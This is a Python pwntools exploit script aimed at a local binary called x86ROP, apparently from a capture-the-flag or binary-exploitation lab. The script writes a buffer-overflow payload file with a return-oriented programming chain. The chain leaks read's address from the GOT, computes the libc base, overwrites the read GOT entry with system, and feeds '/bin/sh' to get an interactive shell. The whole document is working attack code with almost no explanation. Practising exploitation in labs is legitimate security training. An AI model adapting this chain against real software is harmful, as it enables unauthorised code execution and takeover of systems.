from os import access
from pwn import *

e = ELF("./x86ROP")
libc = ELF('/usr/lib/i386-linux-gnu/libc-2.31.so') # ubuntu 20.04 ver
# libc = ELF('/lib/i386-linux-gnu/libc-2.27.so') # ubuntu 18.04 ver

MAGIC_ID = 0xffe4
FILE_TYPE_RAWTEXT = 1

# gadgets
read_plt = e.plt['read']
read_got = e.got['read']

print_usage = 0x080485c6

pop2ret = 0x080489ea # pop edi ebp
pop3ret = 0x080489e9 # pop esi edi ebp

# payload
payload  = p32(0xe4ff)
payload += p32(128)
payload += p32(FILE_TYPE_RAWTEXT)
payload += p32(512)
payload += b"A"*0xb4 + b'B'*0x8

# print_usage(read_got)
payload += p32(print_usage)
payload += p32(pop2ret) + p32(read_got) + p32(0)

# read(0, read_got, 0x8) <- system + /bin/sh
payload += p32(read_plt)
payload += p32(pop3ret) + p32(0) + p32(read_got) + p32(0x16)

# read("/bin/sh") == system("/bin/sh")
payload += p32(read_plt)
payload += p32(pop2ret) + p32(read_got+0x4) + p32(0)

with open('payload', 'wb') as f:
    f.write(payload)

# Exploit
p = process(["./x86ROP", "payload"])

p.recvuntil('failed.\n')

read_addr = p.recv(4)

read_addr = u32(read_addr)

libc_base = read_addr - libc.symbols['read']
system = libc.symbols['system'] + libc_base

print('read_got: ', end='')
print(hex(read_got))

print('read: ', end='')
print(hex(read_addr))

print('system: ', end='')
print(hex(system))

p.send(p32(system) + b'/bin/sh\x00')

p.recv()

p.interactive()